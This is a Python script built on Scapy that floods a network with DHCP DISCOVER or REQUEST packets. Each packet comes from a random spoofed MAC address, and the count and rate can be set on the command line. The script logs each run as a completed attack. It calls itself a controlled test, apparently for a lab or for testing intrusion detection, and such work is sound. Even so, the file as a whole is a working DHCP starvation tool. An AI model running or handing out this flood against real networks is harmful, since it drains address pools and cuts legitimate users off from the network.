#!/usr/bin/env python3
"""
Controlled DHCP Flooding Test Script using Scapy.
Supports both positional arguments and CLI flags:
  python3 /home/ubuntu/dhcp_flood_scapy.py 60 0.04 discover
  python3 /home/ubuntu/dhcp_flood_scapy.py --rate 25 --count 60
"""
import sys
import time
import random
import argparse

try:
    from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
except ImportError:
    print("Scapy is not installed. Please use Yersinia.")
    sys.exit(1)

def random_mac():
    return "02:fe:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(4))

def send_dhcp_flood(count=60, delay=0.04, msg_type="discover", iface="eth0"):
    msg_type = msg_type.lower()
    t0 = time.time()
    print(f"[*] Sending {count} DHCP {msg_type.upper()} packets on {iface} (interval: {delay}s)...")
    try:
        for i in range(count):
            mac = random_mac()
            chaddr = bytes.fromhex(mac.replace(":", "")) + b"\x00" * 10
            if msg_type == "request":
                dhcp_opts = [("message-type", "request"), ("requested_addr", "10.10.0.100"), "end"]
            else:
                dhcp_opts = [("message-type", "discover"), "end"]

            pkt = (
                Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(op=1, chaddr=chaddr, xid=random.randint(1, 0xFFFFFFFF)) /
                DHCP(options=dhcp_opts)
            )
            sendp(pkt, iface=iface, verbose=False)
            if (i + 1) % 10 == 0 or (i + 1) == count:
                print(f"    [{i+1}/{count}] Sent DHCP {msg_type.upper()} (spoofed MAC: {mac})")
            time.sleep(delay)
    except KeyboardInterrupt:
        print("\n[!] Flood stopped by user (Ctrl+C).")
    dur = max(0.01, time.time() - t0)
    summary = f"ATTACK_COMPLETED: count={count} type={msg_type} duration={dur:.2f}s\n"
    print(f"[OK] {summary.strip()}")
    try:
        with open("/var/log/attack_flood.log", "a", encoding="utf-8") as f:
            f.write(summary)
    except Exception:
        pass

if __name__ == "__main__":
    if len(sys.argv) > 1 and not sys.argv[1].startswith("-"):
        count = int(sys.argv[1]) if len(sys.argv) > 1 else 60
        delay = float(sys.argv[2]) if len(sys.argv) > 2 else 0.04
        mtype = sys.argv[3] if len(sys.argv) > 3 else "discover"
        send_dhcp_flood(count=count, delay=delay, msg_type=mtype)
    else:
        parser = argparse.ArgumentParser(description="Controlled DHCP Flooding with Scapy")
        parser.add_argument("--count", type=int, default=60, help="Number of DHCP packets (default: 60)")
        parser.add_argument("--rate", type=float, default=25.0, help="Packets per second (default: 25)")
        parser.add_argument("--type", default="discover", choices=["discover", "request"], help="DHCP packet type")
        parser.add_argument("--iface", default="eth0", help="Network interface (default: eth0)")
        args = parser.parse_args()
        delay = 1.0 / max(1.0, args.rate)
        send_dhcp_flood(count=args.count, delay=delay, msg_type=args.type, iface=args.iface)

